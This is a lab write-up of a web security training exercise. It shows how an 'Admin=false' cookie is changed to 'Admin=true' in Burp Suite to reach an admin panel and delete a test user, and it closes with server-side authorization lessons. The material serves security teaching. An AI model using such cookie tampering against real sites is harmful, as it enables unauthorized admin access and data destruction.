# Lab: Admin Panel with Forgeable Cookie

## 1. Lab Description
 This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.

Solve the lab by accessing the admin panel and using it to delete the user 'carlos'.

You can log in to your own account using the following credentials: 'wiener:peter' 

---

## 2. Reconnaissance

I logged into the application using the provided credentials and observed the HTTP requests in Burp Suite.

The following request was made to the account page:

```
GET /my-account?id=wiener HTTP/2
Host: <target-host>
Cookie: session=...; Admin=false
```

---

## 3. Analysis

The request revealed an important authorization mechanism:

```
Admin=false
```

This indicates that admin access is determined by a client-side cookie value, which can potentially be modified.

Since cookies are controlled by the client, this suggests a **forgeable cookie-based access control flaw**.

---

## 4. Exploitation

I modified the request in Burp Suite Repeater and changed the cookie value:

### Original Request

```
Cookie: session=...; Admin=false
```

### Modified Request

```
Cookie: session=...; Admin=true
```

After modifying the cookie, I sent a request to the admin endpoint:

```
GET /admin HTTP/2
Host: <target-host>
Cookie: session=...; Admin=true
```

The server granted access to the admin panel.

---

## 5. Execution

Inside the admin panel, I located the user management interface and deleted the target user:

```
carlos
```

---

## 6. Result

The lab was successfully completed after deleting the user `carlos`.

---

## 7. Key Learning

* Client-side cookies should never be trusted for authorization decisions
* Access control must be enforced server-side
* Manipulating cookies can reveal weak authentication/authorization logic
* Always validate user roles on the backend, not in the browser or request headers
